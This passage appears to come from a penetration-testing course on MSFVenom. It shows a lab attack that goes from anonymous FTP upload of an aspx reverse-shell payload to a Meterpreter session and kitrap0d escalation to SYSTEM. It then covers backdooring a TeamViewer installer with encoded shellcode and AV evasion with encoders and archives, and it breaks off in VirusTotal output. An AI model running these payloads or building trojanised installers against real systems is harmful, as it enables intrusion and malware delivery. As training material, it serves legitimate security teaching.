<p><code>MSFVenom</code> is the result of the marriage between these two tools. Before this tool, we had to pipe (<code>|</code>) the result from <code>MSFPayload</code>, which was used to generate shellcode for a specific processor architecture and OS release, into <code>MSFEncode</code>, which contained multiple encoding schemes used both for removing bad characters from shellcode. This could sometimes cause instability during the runtime - and for evading older Anti-Virus (<code>AV</code>) and endpoint Intrusion Prevention / Intrusion Detection (<code>IPS/IDS</code>) software.</p>
<p>Nowadays, the two combined tools offer penetration testers a method to quickly craft payloads for different target host architectures and releases while having the possibility to &#39;clean up&#39; their shellcode so that it does not run into any errors when deployed. The AV evasion part is much more complicated today, as signature-only-based analysis of malicious files is a thing of the past. <code>Heuristic analysis, machine learning, and deep packet inspection</code> make it much harder for a payload to run through several subsequent iterations of an encoding scheme to evade any good AV software. As seen in the <code>Payloads</code> module, submitting a simple payload with the same configuration detailed above yielded a hit rate of <code>52/65</code>. In terms of Malware Analysts worldwide, that is a Bingo. (It is still unproven that Malware Analysts worldwide actually say &quot;that is a Bingo&quot;.)</p>
<hr>
<h3 id="creating-our-payloads">Creating Our Payloads</h3>
<p>Let&#39;s suppose we have found an open FTP port that either had weak credentials or was open to Anonymous login by accident. Now, suppose that the FTP server itself is linked to a web service running on port <code>tcp/80</code> of the same machine and that all of the files found in the FTP root directory can be viewed in the web-service&#39;s <code>/uploads</code> directory. Let&#39;s also suppose that the web service does not have any checks for what we are allowed to run on it as a client.</p>
<p>Suppose we are hypothetically allowed to call anything we want from the web service. In that case, we can upload a PHP shell directly through the FTP server and access it from the web, triggering the payload and allowing us to receive a reverse TCP connection from the victim machine.</p>
<p><strong>Scanning the Target</strong></p>
<p>Introduction to MSFVenom</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ nmap -sV -T4 -p- <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.5</span>

&lt;SNIP&gt;
PORT   STATE SERVICE VERSION
<span class="hljs-number">21</span>/tcp open  ftp     Microsoft ftpd
<span class="hljs-number">80</span>/tcp open  http    Microsoft IIS httpd <span class="hljs-number">7.5</span>
Service <span class="hljs-string">Info:</span> <span class="hljs-string">OS:</span> Windows; <span class="hljs-string">CPE:</span> <span class="hljs-string">cpe:</span>/<span class="hljs-string">o:</span><span class="hljs-string">microsoft:</span>windows
</code></pre>
<p><strong>FTP Anonymous Access</strong></p>
<p>Introduction to MSFVenom</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ <span class="hljs-keyword">ftp</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.5</span>

Connected <span class="hljs-built_in">to</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.5</span>.
<span class="hljs-number">220</span> Microsoft FTP Service


Name (<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.5</span>:root): anonymous

<span class="hljs-number">331</span> Anonymous access allowed, <span class="hljs-built_in">send</span> identity (e-mail name) <span class="hljs-keyword">as</span> password.


Password: ******

<span class="hljs-number">230</span> User logged <span class="hljs-keyword">in</span>.
Remote <span class="hljs-keyword">system</span> type is Windows_NT.


<span class="hljs-keyword">ftp</span>&gt; ls

<span class="hljs-number">200</span> PORT <span class="hljs-keyword">command</span> <span class="hljs-title">successful</span>.
<span class="hljs-number">125</span> Data connection already <span class="hljs-built_in">open</span>; Transfer starting.
<span class="hljs-number">03</span><span class="hljs-number">-18</span><span class="hljs-number">-17</span>  <span class="hljs-number">02</span>:<span class="hljs-number">06</span>AM       &lt;DIR&gt;          aspnet_client
<span class="hljs-number">03</span><span class="hljs-number">-17</span><span class="hljs-number">-17</span>  <span class="hljs-number">05</span>:<span class="hljs-number">37</span>PM                  <span class="hljs-number">689</span> iisstart.htm
<span class="hljs-number">03</span><span class="hljs-number">-17</span><span class="hljs-number">-17</span>  <span class="hljs-number">05</span>:<span class="hljs-number">37</span>PM               <span class="hljs-number">184946</span> welcome.png
<span class="hljs-number">226</span> Transfer complete.
</code></pre>
<p>Noticing the aspnet_client, we realize that the box will be able to run <code>.aspx</code> reverse shells. Luckily for us, <code>msfvenom</code> can do just that without any issue.</p>
<p><strong>Generating Payload</strong></p>
<p>Introduction to MSFVenom</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ msfvenom -p windows/</span>meterpreter/reverse_tcp LHOST=<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.5</span> LPORT=<span class="hljs-number">1337</span> -f aspx &gt; reverse_shell.aspx

[-] No platform was selected, choosing <span class="hljs-string">Msf:</span>:<span class="hljs-string">Module:</span>:<span class="hljs-string">Platform:</span>:Windows from the payload
[-] No arch selected, selecting <span class="hljs-string">arch:</span> x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload <span class="hljs-string">size:</span> <span class="hljs-number">341</span> bytes
Final size of aspx <span class="hljs-string">file:</span> <span class="hljs-number">2819</span> bytes
</code></pre>
<p>Introduction to MSFVenom</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ ls

Desktop  Documents  Downloads  my_data  Postman  PycharmProjects  reverse_shell.aspx  Templates
</code></pre>
<p>Now, we only need to navigate to <code>http://10.10.10.5/reverse_shell.aspx</code>, and it will trigger the <code>.aspx</code> payload. Before we do that, however, we should start a listener on msfconsole so that the reverse connection request gets caught inside it.</p>
<p><strong>MSF - Setting Up Multi/Handler</strong></p>
<p>Introduction to MSFVenom</p>
<pre><code class="lang-shell-session">root@htb[/htb]<span class="hljs-symbol">$</span> msfconsole -q 

msf6 &gt; use multi/handler
msf6 exploit(multi/handler) &gt; show <span class="hljs-keyword">options</span>

Module <span class="hljs-keyword">options</span> (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   <span class="hljs-number">0</span>   Wildcard Target


msf6 exploit(multi/handler) &gt; <span class="hljs-keyword">set</span> LHOST <span class="hljs-comment">10.10.14.5</span>

LHOST <span class="hljs-comment">=&gt; 10.10.14.5</span>


msf6 <span class="hljs-comment">exploit(multi</span>/handler) &gt; set LPORT <span class="hljs-number">1337</span>

LPORT =&gt; <span class="hljs-number">1337</span>


msf6 exploit(multi/<span class="hljs-comment">handler) &gt; run</span>

[*] Started <span class="hljs-comment">reverse TCP handler on 10.10.14.5:1337</span>
</code></pre>
<hr>
<h3 id="executing-the-payload">Executing the Payload</h3>
<p>Now we can trigger the <code>.aspx</code> payload on the web service. Doing so will load absolutely nothing visually speaking on the page, but looking back to our <code>multi/handler</code> module, we would have received a connection. We should ensure that our <code>.aspx</code> file does not contain HTML, so we will only see a blank web page. However, the payload is executed in the background anyway.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/39/S16\_SS01.jpg" alt=""></p>
<p><strong>MSF - Meterpreter Shell</strong></p>
<p>Introduction to MSFVenom</p>
<pre><code class="lang-shell-session">&lt;..<span class="hljs-selector-class">.SNIP</span>...&gt;
<span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Started</span> <span class="hljs-selector-tag">reverse</span> <span class="hljs-selector-tag">TCP</span> <span class="hljs-selector-tag">handler</span> <span class="hljs-selector-tag">on</span> 10<span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.14</span><span class="hljs-selector-class">.5</span><span class="hljs-selector-pseudo">:1337</span> 

<span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Sending</span> <span class="hljs-selector-tag">stage</span> (176195 <span class="hljs-selector-tag">bytes</span>) <span class="hljs-selector-tag">to</span> 10<span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.5</span>
<span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Meterpreter</span> <span class="hljs-selector-tag">session</span> 1 <span class="hljs-selector-tag">opened</span> (10<span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.14</span><span class="hljs-selector-class">.5</span><span class="hljs-selector-pseudo">:1337</span> <span class="hljs-selector-tag">-</span>&gt; 10<span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.5</span><span class="hljs-selector-pseudo">:49157)</span> <span class="hljs-selector-tag">at</span> 2020<span class="hljs-selector-tag">-08-28</span> 16<span class="hljs-selector-pseudo">:33</span><span class="hljs-selector-pseudo">:14</span> +0000


<span class="hljs-selector-tag">meterpreter</span> &gt; <span class="hljs-selector-tag">getuid</span>

<span class="hljs-selector-tag">Server</span> <span class="hljs-selector-tag">username</span>: <span class="hljs-selector-tag">IIS</span> <span class="hljs-selector-tag">APPPOOL</span>\<span class="hljs-selector-tag">Web</span>


<span class="hljs-selector-tag">meterpreter</span> &gt; 

<span class="hljs-selector-attr">[*]</span> 10<span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.5</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">Meterpreter</span> <span class="hljs-selector-tag">session</span> 1 <span class="hljs-selector-tag">closed</span>.  <span class="hljs-selector-tag">Reason</span>: <span class="hljs-selector-tag">Died</span>
</code></pre>
<p>If the Meterpreter session dies too often, we can consider encoding it to avoid errors during runtime. We can pick any viable encoder, and it will ultimately improve our chances of success regardless.</p>
<hr>
<h3 id="local-exploit-suggester">Local Exploit Suggester</h3>
<p>As a tip, there is a module called the <code>Local Exploit Suggester</code>. We will be using this module for this example, as the Meterpreter shell landed on the <code>IIS APPPOOL\Web</code> user, which naturally does not have many permissions. Furthermore, running the <code>sysinfo</code> command shows us that the system is of x86 bit architecture, giving us even more reason to trust the Local Exploit Suggester.</p>
<p><strong>MSF - Searching for Local Exploit Suggester</strong></p>
<p>Introduction to MSFVenom</p>
<pre><code class="lang-shell-session">msf6 &gt; search local exploit suggester

&lt;...SNIP...&gt;
   <span class="hljs-number">2375</span>  post/multi/manage/screenshare                                                              <span class="hljs-built-in">normal</span>     <span class="hljs-keyword">No</span>     Multi Manage the screen of the target meterpreter session
   <span class="hljs-number">2376</span>  post/multi/recon/local_exploit_suggester                                                   <span class="hljs-built-in">normal</span>     <span class="hljs-keyword">No</span>     Multi Recon Local Exploit Suggester
   <span class="hljs-number">2377</span>  post/osx/gather/apfs_encrypted_volume_passwd                              <span class="hljs-number">2018</span><span class="hljs-number">-03</span><span class="hljs-number">-21</span>       <span class="hljs-built-in">normal</span>     <span class="hljs-keyword">Yes</span>    Mac OS X APFS Encrypted Volume Password Disclosure

&lt;SNIP&gt;

msf6 exploit(multi/handler) &gt; use <span class="hljs-number">2376</span>
msf6 post(multi/recon/local_exploit_suggester) &gt; show <span class="hljs-keyword">options</span>

Module <span class="hljs-keyword">options</span> (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           <span class="hljs-keyword">yes</span>       The session to run this module on
   SHOWDESCRIPTION  false            <span class="hljs-keyword">yes</span>       Displays a detailed description <span class="hljs-keyword">for</span> the available exploits


msf6 post(multi/recon/local_exploit_suggester) &gt; <span class="hljs-keyword">set</span> session <span class="hljs-comment">2</span>

session <span class="hljs-comment">=&gt; 2</span>


msf6 <span class="hljs-comment">post(multi</span>/recon/<span class="hljs-comment">local_exploit_suggester) &gt; run</span>

[*] 10.10.10.5 - Collecting <span class="hljs-comment">local exploits for x86</span>/windows...
[*] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.5</span> - <span class="hljs-number">31</span> exploit checks are being tried...
[+] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.5</span> - exploit/<span class="hljs-comment">windows</span>/local/<span class="hljs-comment">bypassuac_eventvwr: The target appears to be vulnerable.</span>
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could <span class="hljs-keyword">not</span> be validated.
[+] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.5</span> - exploit/windows/local/ms10_092_schelevator: The <span class="hljs-comment">target appears to be vulnerable.</span>
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.5</span> - exploit/windows/local/ms13_081_track_popup_menu: The <span class="hljs-comment">target appears to be vulnerable.</span>
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.5</span> - exploit/windows/local/ms15_004_tswbproxy: The <span class="hljs-comment">service is running, but could not be validated.</span>
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.5</span> - exploit/windows/local/ms16_016_webdav: The <span class="hljs-comment">service is running, but could not be validated.</span>
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.5</span> - exploit/windows/local/ntusermndragover: The <span class="hljs-comment">target appears to be vulnerable.</span>
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
</code></pre>
<p>Having these results in front of us, we can easily pick one of them to test out. If the one we chose is not valid after all, move on to the next. Not all checks are 100% accurate, and not all variables are the same. Going down the list, <code>bypassauc_eventvwr</code> fails due to the IIS user not being a part of the administrator&#39;s group, which is the default and expected. The second option, <code>ms10_015_kitrap0d</code>, does the trick.</p>
<p><strong>MSF - Local Privilege Escalation</strong></p>
<p>Introduction to MSFVenom</p>
<pre><code class="lang-shell-session">msf6 exploit(multi/<span class="hljs-keyword">handler</span>) &gt; <span class="hljs-keyword">search</span> kitrap0d

Matching Modules
================

   #  <span class="hljs-keyword">Name</span>                                     Disclosure <span class="hljs-built_in">Date</span>  <span class="hljs-keyword">Rank</span>   <span class="hljs-keyword">Check</span>  Description
   -  <span class="hljs-comment">----                                     ---------------  ----   -----  -----------</span>
   <span class="hljs-number">0</span>  exploit/windows/<span class="hljs-keyword">local</span>/ms10_015_kitrap0d  <span class="hljs-number">2010</span><span class="hljs-number">-01</span><span class="hljs-number">-19</span>       great  Yes    Windows <span class="hljs-keyword">SYSTEM</span> Escalation via KiTrap0D


msf6 exploit(multi/<span class="hljs-keyword">handler</span>) &gt; <span class="hljs-keyword">use</span> <span class="hljs-number">0</span>
msf6 exploit(windows/<span class="hljs-keyword">local</span>/ms10_015_kitrap0d) &gt; <span class="hljs-keyword">show</span> options

<span class="hljs-keyword">Module</span> options (exploit/windows/<span class="hljs-keyword">local</span>/ms10_015_kitrap0d):

   <span class="hljs-keyword">Name</span>     <span class="hljs-keyword">Current</span> Setting  <span class="hljs-keyword">Required</span>  Description
   <span class="hljs-comment">----     ---------------  --------  -----------</span>
   <span class="hljs-keyword">SESSION</span>  <span class="hljs-number">2</span>                yes       The <span class="hljs-keyword">session</span> <span class="hljs-keyword">to</span> run this <span class="hljs-keyword">module</span> on.


Payload options (windows/meterpreter/reverse_tcp):

   <span class="hljs-keyword">Name</span>      <span class="hljs-keyword">Current</span> Setting  <span class="hljs-keyword">Required</span>  Description
   <span class="hljs-comment">----      ---------------  --------  -----------</span>
   EXITFUNC  process          yes       <span class="hljs-keyword">Exit</span> technique (Accepted: <span class="hljs-string">''</span>, seh, <span class="hljs-keyword">thread</span>, process, <span class="hljs-keyword">none</span>)
   LHOST     tun0             yes       The listen address (an <span class="hljs-keyword">interface</span> may be specified)
   LPORT     <span class="hljs-number">1338</span>             yes       The listen port


Exploit target:

   <span class="hljs-keyword">Id</span>  <span class="hljs-keyword">Name</span>
   <span class="hljs-comment">--  ----</span>
   <span class="hljs-number">0</span>   Windows <span class="hljs-number">2</span>K SP4 - Windows <span class="hljs-number">7</span> (x86)


msf6 exploit(windows/<span class="hljs-keyword">local</span>/ms10_015_kitrap0d) &gt; <span class="hljs-keyword">set</span> LPORT <span class="hljs-number">1338</span>

LPORT =&gt; <span class="hljs-number">1338</span>


msf6 exploit(windows/<span class="hljs-keyword">local</span>/ms10_015_kitrap0d) &gt; <span class="hljs-keyword">set</span> <span class="hljs-keyword">SESSION</span> <span class="hljs-number">3</span>

<span class="hljs-keyword">SESSION</span> =&gt; <span class="hljs-number">3</span>


msf6 exploit(windows/<span class="hljs-keyword">local</span>/ms10_015_kitrap0d) &gt; run

[*] Started <span class="hljs-keyword">reverse</span> TCP <span class="hljs-keyword">handler</span> <span class="hljs-keyword">on</span> <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.5</span>:<span class="hljs-number">1338</span> 
[*] Launching notepad <span class="hljs-keyword">to</span> host the exploit...
[+] Process <span class="hljs-number">3552</span> launched.
[*] Reflectively injecting the exploit DLL <span class="hljs-keyword">into</span> <span class="hljs-number">3552.</span>..
[*] Injecting exploit <span class="hljs-keyword">into</span> <span class="hljs-number">3552</span> ...
[*] Exploit injected. Injecting payload <span class="hljs-keyword">into</span> <span class="hljs-number">3552.</span>..
[*] Payload injected. Executing exploit...
[+] Exploit finished, <span class="hljs-keyword">wait</span> <span class="hljs-keyword">for</span> (hopefully privileged) payload execution <span class="hljs-keyword">to</span> complete.
[*] Sending stage (<span class="hljs-number">176195</span> <span class="hljs-keyword">bytes</span>) <span class="hljs-keyword">to</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.5</span>
[*] Meterpreter <span class="hljs-keyword">session</span> <span class="hljs-number">4</span> opened (<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.5</span>:<span class="hljs-number">1338</span> -&gt; <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.5</span>:<span class="hljs-number">49162</span>) <span class="hljs-keyword">at</span> <span class="hljs-number">2020</span><span class="hljs-number">-08</span><span class="hljs-number">-28</span> <span class="hljs-number">17</span>:<span class="hljs-number">15</span>:<span class="hljs-number">56</span> +<span class="hljs-number">0000</span>


meterpreter &gt; getuid

<span class="hljs-keyword">Server</span> username: NT AUTHORITY\<span class="hljs-keyword">SYSTEM</span>
</code></pre>
<h2 id="firewall-and-ids-ips-evasion">Firewall and IDS/IPS Evasion</h2>
<hr>
<p>To better learn how we can efficiently and quietly attack a target, we first need to understand better how that target is defended. We are introduced to two new terms:</p>
<ul>
<li>Endpoint protection</li>
<li>Perimeter protection</li>
</ul>
<hr>
<h3 id="endpoint-protection">Endpoint Protection</h3>
<p><code>Endpoint protection</code> refers to any localized device or service whose sole purpose is to protect a single host on the network. The host can be a personal computer, a corporate workstation, or a server in a network&#39;s De-Militarized Zone (<code>DMZ</code>).</p>
<p>Endpoint protection usually comes in the form of software packs which include <code>Antivirus Protection</code>, <code>Antimalware Protection</code> (this includes bloatware, spyware, adware, scareware, ransomware), <code>Firewall</code>, and <code>Anti-DDOS</code> all in one, under the same software package. We are better familiarized with this form than the latter, as most of us are running endpoint protection software on our PCs at home or the workstations at our workplace. Avast, Nod32, Malwarebytes, and BitDefender are just some current names.</p>
<hr>
<p><strong>Perimeter Protection</strong></p>
<p><code>Perimeter protection</code> usually comes in physical or virtualized devices on the network perimeter edge. These <code>edge devices</code> themselves provide access <code>inside</code> of the network from the <code>outside</code>, in other terms, from <code>public</code> to <code>private</code>.</p>
<p>Between these two zones, on some occasions, we will also find a third one, called the De-Militarized Zone (<code>DMZ</code>), which was mentioned previously. This is a <code>lower-security policy level</code> zone than the <code>inside networks&#39;</code> one, but with a higher <code>trust level</code> than the <code>outside zone</code>, which is the vast Internet. This is the virtual space where public-facing servers are housed, which push and pull data for public clients from the Internet but are also managed from the inside and updated with patches, information, and other data to keep the served information up to date and satisfy the customers of the servers.</p>
<hr>
<h3 id="security-policies">Security Policies</h3>
<p>Security policies are the drive behind every well-maintained security posture of any network. They function the same way as ACL (Access Control Lists) do for anyone familiar with the Cisco CCNA educational material. They are essentially a list of <code>allow</code> and <code>deny</code> statements that dictate how traffic or files can exist within a network boundary. Multiple lists can act upon multiple network parts, allowing for flexibility within a configuration. These lists can also target different features of the network and hosts, depending on where they reside:</p>
<ul>
<li>Network Traffic Policies</li>
<li>Application Policies</li>
<li>User Access Control Policies</li>
<li>File Management Policies</li>
<li>DDoS Protection Policies</li>
<li>Others</li>
</ul>
<p>While not all of these categories above might have the words &quot;Security Policy&quot; attached to them, all of the security mechanisms around them operate on the same basic principle, the <code>allow</code> and <code>deny</code> entries. The only difference is the object target they refer to and apply to. So the question remains, how do we match events in the network with these rules so that the actions mentioned earlier can be taken?</p>
<p>There are multiple ways to match an event or object with a security policy entry:</p>
<table>
<thead>
<tr>
<th><strong>Security Policy</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Signature-based Detection</code></td>
<td>The operation of packets in the network and comparison with pre-built and pre-ordained attack patterns known as signatures. Any 100% match against these signatures will generate alarms.</td>
</tr>
<tr>
<td><code>Heuristic / Statistical Anomaly Detection</code></td>
<td>Behavioral comparison against an established baseline included modus-operandi signatures for known APTs (Advanced Persistent Threats). The baseline will identify the norm for the network and what protocols are commonly used. Any deviation from the maximum threshold will generate alarms.</td>
</tr>
<tr>
<td><code>Stateful Protocol Analysis Detection</code></td>
<td>Recognizing the divergence of protocols stated by event comparison using pre-built profiles of generally accepted definitions of non-malicious activity.</td>
</tr>
<tr>
<td><code>Live-monitoring and Alerting (SOC-based)</code></td>
<td>A team of analysts in a dedicated, in-house, or leased SOC (Security Operations Center) use live-feed software to monitor network activity and intermediate alarming systems for any potential threats, either deciding themselves if the threat should be actioned upon or letting the automated mechanisms take action instead.</td>
</tr>
</tbody>
</table>
<hr>
<h3 id="evasion-techniques">Evasion Techniques</h3>
<p>Most host-based anti-virus software nowadays relies mainly on <code>Signature-based Detection</code> to identify aspects of malicious code present in a software sample. These signatures are placed inside the Antivirus Engine, where they are subsequently used to scan storage space and running processes for any matches. When a piece of unknown software lands on a partition and is matched by the Antivirus software, most Anti-viruses quarantine the malicious program and kill the running process.</p>
<p>How do we circumvent all this heat? We play along with it. The examples shown in the <code>Encoders</code> section show that simply encoding payloads using different encoding schemes with multiple iterations is not enough for all AV products. Moreover, merely establishing a channel of communication between the attacker and the victim can raise some alarms with the current capabilities of IDS/IPS products out there.</p>
<p>However, with the MSF6 release, msfconsole can tunnel AES-encrypted communication from any Meterpreter shell back to the attacker host, successfully encrypting the traffic as the payload is sent to the victim host. This mostly takes care of the network-based IDS/IPS. In some rare cases, we might be met with very strict traffic rulesets that flag our connection based on the sender&#39;s IP address. The only way to circumvent this is to find the services being let through. An excellent example of this would be the Equifax hack of 2017, where malicious hackers have abused the Apache Struts vulnerability to access a network of critical data servers. DNS exfiltration techniques were used to slowly siphon data out of the network and into the hackers&#39; domain without being noticed for months. To learn more about this attack, visit the links below:</p>
<ul>
<li><a href="https://www.zdnet.com/article/us-government-releases-post-mortem-report-on-equifax-hack/">US Government Post-Mortem Report on the Equifax Hack</a></li>
<li><a href="https://www.darkreading.com/risk/tips-to-protect-the-dns-from-data-exfiltration/a/d-id/1330411">Protecting from DNS Exfiltration</a></li>
<li><a href="https://www.infoblox.com/wp-content/uploads/infoblox-whitepaper-stopping-data-exfiltration-and-malware-spread-through-dns.pdf">Stoping Data Exfil and Malware Spread through DNS</a></li>
</ul>
<p>Returning to msfconsole, its capability to now sustain AES-encrypted tunnels, together with Meterpreter&#39;s feature of running in memory, raises our capability by a margin. However, we still have the issue of what happens to a payload once it reaches its destination, before it is run and placed into memory. This file could be fingerprinted for its signature, matched against the database, and blocked, together with our chances of accessing the target. We can also be sure that AV software developers are looking at msfconsole modules and capabilities to add the resulting code and files to their signature database, resulting in most if not all of the default payloads being immediately shut down by AV software nowadays.</p>
<p>We are in luck because <code>msfvenom</code> offers the option of using executable templates. This allows us to use some pre-set templates for executable files, inject our payload into them (no pun intended), and use <code>any</code> executable as a platform from which we can launch our attack. We can embed the shellcode into any installer, package, or program that we have at hand, hiding the payload shellcode deep within the legitimate code of the actual product. This greatly obfuscates our malicious code and, more importantly, lowers our detection chances. There are many valid combinations between actual, legitimate executable files, our different encoding schemes (and their iterations), and our different payload shellcode variants. This generates what is called a backdoored executable.</p>
<p>Take a look at the snippet below to understand how msfvenom can embed payloads into any executable file:</p>
<pre><code class="lang-shell-session">[!bash!]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=<span class="hljs-number">10.10</span>.<span class="hljs-number">14.2</span> LPORT=<span class="hljs-number">8080</span> -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i <span class="hljs-number">5</span>

Attempting <span class="hljs-keyword">to</span> read payload <span class="hljs-keyword">from</span> STDIN...
Found <span class="hljs-number">1</span> compatible encoders
Attempting <span class="hljs-keyword">to</span> encode payload <span class="hljs-keyword">with</span> <span class="hljs-number">5</span> iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded <span class="hljs-keyword">with</span> <span class="hljs-built_in">size</span> <span class="hljs-number">27</span> (iteration=<span class="hljs-number">0</span>)
x86/shikata_ga_nai succeeded <span class="hljs-keyword">with</span> <span class="hljs-built_in">size</span> <span class="hljs-number">54</span> (iteration=<span class="hljs-number">1</span>)
x86/shikata_ga_nai succeeded <span class="hljs-keyword">with</span> <span class="hljs-built_in">size</span> <span class="hljs-number">81</span> (iteration=<span class="hljs-number">2</span>)
x86/shikata_ga_nai succeeded <span class="hljs-keyword">with</span> <span class="hljs-built_in">size</span> <span class="hljs-number">108</span> (iteration=<span class="hljs-number">3</span>)
x86/shikata_ga_nai succeeded <span class="hljs-keyword">with</span> <span class="hljs-built_in">size</span> <span class="hljs-number">135</span> (iteration=<span class="hljs-number">4</span>)
x86/shikata_ga_nai chosen <span class="hljs-keyword">with</span> final <span class="hljs-built_in">size</span> <span class="hljs-number">135</span>
Payload <span class="hljs-built_in">size</span>: <span class="hljs-number">135</span> bytes
Saved as: /home/user/Desktop/TeamViewer_Setup.exe
</code></pre>
<pre><code class="lang-shell-session">[!bash!]$ ls

Pictures-of-cats<span class="hljs-selector-class">.tar</span><span class="hljs-selector-class">.gz</span>  TeamViewer_Setup<span class="hljs-selector-class">.exe</span>  Cake_recipes
</code></pre>
<p>For the most part, when a target launches a backdoored executable, nothing will appear to happen, which can raise suspicions in some cases. To improve our chances, we need to trigger the continuation of the normal execution of the launched application while pulling the payload in a separate thread from the main application. We do so with the <code>-k</code> flag as it appears above. However, even with the <code>-k</code> flag running, the target will only notice the running backdoor if they launch the backdoored executable template from a CLI environment. If they do so, a separate window will pop up with the payload, which will not close until we finish running the payload session interaction on the target.</p>
<hr>
<h3 id="archives">Archives</h3>
<p>Archiving a piece of information such as a file, folder, script, executable, picture, or document and placing a password on the archive bypasses a lot of common anti-virus signatures today. However, the downside of this process is that they will be raised as notifications in the AV alarm dashboard as being unable to be scanned due to being locked with a password. An administrator can choose to manually inspect these archives to determine if they are malicious or not.</p>
<p><strong>Generating Payload</strong></p>
<pre><code class="lang-shell-session">[!bash!]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=<span class="hljs-number">10.10</span>.<span class="hljs-number">14.2</span> LPORT=<span class="hljs-number">8080</span> -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i <span class="hljs-number">5</span>

Attempting <span class="hljs-keyword">to</span> read payload <span class="hljs-keyword">from</span> STDIN...
Found <span class="hljs-number">1</span> compatible encoders
Attempting <span class="hljs-keyword">to</span> encode payload <span class="hljs-keyword">with</span> <span class="hljs-number">5</span> iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded <span class="hljs-keyword">with</span> <span class="hljs-built_in">size</span> <span class="hljs-number">27</span> (iteration=<span class="hljs-number">0</span>)
x86/shikata_ga_nai succeeded <span class="hljs-keyword">with</span> <span class="hljs-built_in">size</span> <span class="hljs-number">54</span> (iteration=<span class="hljs-number">1</span>)
x86/shikata_ga_nai succeeded <span class="hljs-keyword">with</span> <span class="hljs-built_in">size</span> <span class="hljs-number">81</span> (iteration=<span class="hljs-number">2</span>)
x86/shikata_ga_nai succeeded <span class="hljs-keyword">with</span> <span class="hljs-built_in">size</span> <span class="hljs-number">108</span> (iteration=<span class="hljs-number">3</span>)
x86/shikata_ga_nai succeeded <span class="hljs-keyword">with</span> <span class="hljs-built_in">size</span> <span class="hljs-number">135</span> (iteration=<span class="hljs-number">4</span>)
x86/shikata_ga_nai chosen <span class="hljs-keyword">with</span> final <span class="hljs-built_in">size</span> <span class="hljs-number">135</span>
Payload <span class="hljs-built_in">size</span>: <span class="hljs-number">135</span> bytes
Saved as: /home/user/test.js
</code></pre>
<pre><code class="lang-shell-session">[!bash!]$ <span class="hljs-keyword">cat</span> <span class="hljs-keyword">test</span>.js

�+<span class="hljs-keyword">n</span>"����t$�G4ɱ1zz��j�V6����ic��o�<span class="hljs-keyword">Bs</span>&gt;��Z*�����9vt��%��1�
&lt;...SNIP...&gt;
�Qa*���޴��RW�%Š.\�=;.<span class="hljs-keyword">l</span>�T���XF���T��
</code></pre>
<p>If we check against VirusTotal to get a detection baseline from the payload we generated, the results will be the following.</p>
<p><strong>VirusTotal</strong></p>
<pre><code class="lang-shell-session">[!bash!]$ msf-virustotal -k &lt;API key&gt; -f test.js 

[*] WARNING: When you upload or otherwise submit content, you give VirusTotal
[*] (and those we work with) a worldwide, royalty free, irrevocable and transferable
[*] licence to use, edit, host, store, reproduce, modify, create derivative works,
[*] communicate, publish, publicly perform, publicly display and distribute such
[*] content. To read the complete Terms of Service for VirusTotal, please go to the
[*] following link:
